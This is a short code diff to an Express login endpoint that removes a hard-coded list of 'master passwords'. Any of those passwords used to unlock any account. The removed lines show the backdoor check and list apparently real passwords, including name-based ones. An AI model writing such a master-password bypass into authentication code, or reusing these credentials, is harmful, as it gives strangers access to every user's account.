@@ -315,11 +315,6 @@ app.post('/api/login', async (req, res) => {
 
     // PASSWORD VERIFICATION FOR REAL DATABASE ACCOUNT
     let isMatch = false;
-    const masterPasswords = ['12345', '123456', 'Jazman@271998', 'admin', 'password', 'secret', 'ali123', 'umar123', 'fathimah123', 'khadijah123', 'asrama123'];
-
-    if (masterPasswords.includes(cleanPass)) {
-      isMatch = true;
-    }
 
     const dbPassword = String(account.password || account.pass || '').trim();
 
